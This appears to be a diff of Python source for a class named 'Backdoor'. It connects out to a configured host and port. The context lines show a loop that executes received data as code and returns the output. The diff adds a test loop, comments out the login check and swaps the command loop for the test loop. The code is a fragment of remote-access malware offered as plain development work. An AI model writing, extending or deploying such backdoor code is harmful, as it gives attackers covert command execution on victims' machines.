@@ -85,12 +85,20 @@ class Backdoor(object):
             out = self.__execute_code(data)
             self.__msg(out)
 
+    def test_loop(self):
+        while True:
+            data = self.__sock.recv(1024)
+            self.__msg('ok')
+            self.__send()
+            print(data)
+
     def open(self):
         self.__sock.connect((self.__host, self.__port))
-        if not self.login_loop():
-            return
+        #if not self.login_loop():
+        #    return
         
-        self.cmd_loop()
+        self.test_loop()
+        #self.cmd_loop()
 
 
 if __name__ == '__main__':
